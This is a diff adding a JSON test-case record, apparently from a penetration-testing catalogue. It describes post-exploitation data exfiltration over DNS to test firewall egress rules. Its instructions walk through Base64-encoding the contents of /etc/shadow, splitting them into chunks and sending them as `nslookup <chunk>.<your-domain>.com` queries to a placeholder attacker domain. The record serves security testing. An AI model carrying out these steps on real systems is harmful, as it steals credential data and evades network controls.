@@ -1,0 +1,10 @@
+{
+    "key": "HACK-097",
+    "summary": "Data Exfiltration over DNS",
+    "description": "After gaining RCE, exfiltrate data from the compromised server through DNS queries when other outbound traffic (HTTP, FTP) is blocked.",
+    "category": "Post-Exploitation",
+    "severity": "High",
+    "testing_type": "Chained Exploit",
+    "target": "Firewall Egress Rules",
+    "instructions": "1. Pre-requisite: RCE on a target server.\n2. From the shell, take a piece of data you want to exfiltrate (e.g., the content of `/etc/shadow`) and Base64-encode it.\n3. Split the encoded data into chunks small enough for a DNS query.\n4. For each chunk, issue a DNS lookup command like `nslookup <chunk>.<your-domain>.com`. \n5. On your authoritative DNS server for `<your-domain>`, log all incoming queries. Reassemble the chunks from the logs to reconstruct the exfiltrated data."
+}
